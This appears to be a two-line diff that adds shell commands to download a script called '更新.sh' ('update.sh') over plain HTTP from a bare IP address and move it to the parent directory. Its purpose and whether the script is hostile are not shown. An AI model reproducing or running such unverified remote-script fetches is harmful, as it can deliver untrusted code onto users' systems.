@@ -1,0 +1,2 @@
+./wget http://101.32.215.8:8000/gengxin/更新.sh
+mv ./更新.sh ../更新.sh
